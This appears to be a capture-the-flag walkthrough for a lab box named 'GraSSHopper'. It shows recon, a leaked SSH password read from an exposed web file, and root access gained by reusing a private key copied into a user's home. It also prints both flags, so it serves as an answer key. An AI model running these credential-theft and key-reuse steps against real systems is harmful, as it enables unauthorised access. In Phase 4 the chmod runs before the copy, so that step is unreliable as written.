---
title: GraSSHopper
date: 2026-07-29 12:15:00 +0000
categories: [Walkthroughs, WebSecurity]
tags: [pt-garage, ssh, credential-leak, privesc, web-exploitation, WebSecurity]
---

![Intro Banner](/assets/img/custom_banners/2026-07-29-ptg-grasshopper_banner.png)

**SSH Credential Leak + Root Private Key Reuse**

## Phase 1 — Recon
```bash
nmap -sC -sV <TARGET_IP>
```
Apache (80) and SSH (22) are open.

## Phase 2 — Web Enumeration
Browse the site and check for exposed directories:
```bash
curl -s http://<TARGET_IP>/ops/notes.txt
```
**Note:** This exposes SSH credentials directly: `www-user:TO0MucHR0Ot`

## Phase 3 — SSH Login
```bash
ssh www-user@<TARGET_IP>
# password: TO0MucHR0Ot
```
Grab the user flag:
```bash
cat ~/user.txt
```

## Phase 4 — Privilege Escalation (SSH Key Reuse)
Check the home directory for leftover keys:
```bash
ls -la ~/.ssh/keys/
cat ~/.ssh/keys/root
```
This is root's private SSH key, mistakenly copied into www-user's home. Use it directly:
```bash
chmod 600 /tmp/root_key
cp ~/.ssh/keys/root /tmp/root_key
ssh -i /tmp/root_key root@<TARGET_IP>
```

## Phase 5 — Root Flag
```bash
cat /root/root.txt
```

## Flags

| Type | Flag | Path |
|---|---|---|
| user | f7f037df5a943621d631a66e990f4df9 | `/home/www-user/user.txt` |
| root | 688703115b1c8cb47f4b477807cec4ae | `/root/root.txt` |
